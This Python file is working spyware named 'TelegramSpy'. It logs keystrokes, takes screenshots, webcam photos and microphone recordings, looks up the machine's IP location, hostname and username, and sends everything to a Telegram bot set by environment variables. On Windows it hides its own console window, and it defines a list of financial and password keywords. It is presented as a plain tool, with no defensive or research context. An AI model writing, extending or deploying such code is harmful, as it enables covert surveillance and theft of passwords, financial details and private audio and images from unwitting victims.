import os
import platform
import socket
import time
import requests
import cv2
import pyautogui
import geocoder
import sounddevice as sd
import soundfile as sf
from pynput import keyboard
from io import BytesIO
from datetime import datetime
from dotenv import load_dotenv

# Load sensitive data from .env file
load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# Configuration
REPORT_INTERVAL = 60  # Time between logs (in seconds)
MAX_LOG_SIZE = 5000   # Max keystroke log size before sending
AUDIO_RECORD_SECONDS = 10  # Duration of audio clip (in seconds)

class TelegramSpy:
    def __init__(self):
        self.log = ""
        self.last_sent = time.time()
        self.sensitive_keywords = ["password", "login", "bank", "credit", "secret", "cvv", "paypal"]
        self.last_location = None

    def send_to_telegram(self, message, photo=None, document=None):
        """Send text/photo/document to Telegram"""
        try:
            if photo:
                photo.seek(0)
                files = {'photo': photo}
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
                    files=files,
                    data={'chat_id': CHAT_ID, 'caption': message[:1000]}
                )
            elif document:
                document.seek(0)
                files = {'document': document}
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                    files=files,
                    data={'chat_id': CHAT_ID, 'caption': message[:1000]}
                )
            else:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                    data={"chat_id": CHAT_ID, "text": message}
                )
            return True
        except Exception as e:
            print(f"⚠️ Telegram send error: {e}")
            return False

    def capture_screenshot(self):
        """Capture a screenshot and return as BytesIO"""
        try:
            screenshot = pyautogui.screenshot()
            bio = BytesIO()
            bio.name = 'screenshot.png'
            screenshot.save(bio, 'PNG')
            bio.seek(0)
            return bio
        except Exception as e:
            print(f"📸 Screenshot error: {e}")
            return None

    def capture_webcam(self):
        """Capture a webcam photo and return as BytesIO"""
        try:
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                return None
            ret, frame = cam.read()
            cam.release()
            if not ret:
                return None
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = pyautogui.Image.fromarray(frame)
            bio = BytesIO()
            bio.name = 'webcam.jpg'
            img.save(bio, 'JPEG')
            bio.seek(0)
            return bio
        except Exception as e:
            print(f"📷 Webcam error: {e}")
            return None

    def capture_audio(self):
        """Record audio and return as BytesIO"""
        try:
            fs = 44100
            recording = sd.rec(int(AUDIO_RECORD_SECONDS * fs), samplerate=fs, channels=2)
            sd.wait()
            bio = BytesIO()
            bio.name = 'audio.wav'
            sf.write(bio, recording, fs, format='WAV')
            bio.seek(0)
            return bio
        except Exception as e:
            print(f"🎙️ Audio recording error: {e}")
            return None

    def get_location(self):
        """Get IP-based geolocation"""
        try:
            g = geocoder.ip('me')
            if g.ok:
                self.last_location = {
                    'address': g.address,
                    'city': g.city,
                    'country': g.country,
                    'latlng': g.latlng,
                    'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                return self.last_location
        except Exception as e:
            print(f"📍 Geolocation error: {e}")
        return None

    def send_initial_data(self):
        """Send webcam, screenshot, audio, and location"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        location = self.get_location()

        info = (
            f"🚀 **System Activated**\n"
            f"🕒 {timestamp}\n"
            f"💻 {socket.gethostname()} ({os.getlogin()})\n"
            f"🌐 {platform.platform()}\n"
            f"📍 {location.get('address', 'Unknown') if location else 'Unknown'}\n"
        )
        self.send_to_telegram(info)

        screenshot = self.capture_screenshot()
        if screenshot:
            self.send_to_telegram("🖥️ **Screenshot Captured**", photo=screenshot)

        webcam = self.capture_webcam()
        if webcam:
            self.send_to_telegram("📷 **Webcam Photo Captured**", photo=webcam)

        audio = self.capture_audio()
        if audio:
            self.send_to_telegram("🎙️ **Audio Recording**", document=audio)

    def on_key_press(self, key):
        """Log keystrokes and auto-send logs if size exceeded"""
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n[ENTER]\n",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.esc: "[ESC]"
            }
            self.log += special_keys.get(key, f"[{key}]")

        if len(self.log) > MAX_LOG_SIZE:
            self.send_logs()

    def send_logs(self):
        """Send the current keystroke logs"""
        if not self.log:
            return
        message = (
            f"📜 **Keystroke Logs**\n"
            f"🔑 Keys pressed:\n{'-'*40}\n"
            f"{self.log}\n"
            f"{'-'*40}\n"
        )
        self.send_to_telegram(message)
        self.log = ""
        self.last_sent = time.time()

    def start(self):
        """Start the logger and reporting loop"""
        self.send_initial_data()
        with keyboard.Listener(on_press=self.on_key_press) as listener:
            while True:
                time.sleep(REPORT_INTERVAL)
                self.send_logs()

if __name__ == "__main__":
    # Hide the terminal window (Windows only)
    if os.name == 'nt':
        try:
            import win32gui, win32con
            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
        except ImportError:
            print("pywin32 not installed - window will remain visible")

    print("Starting monitoring... (Check Telegram for updates)")
    spy = TelegramSpy()
    spy.start()
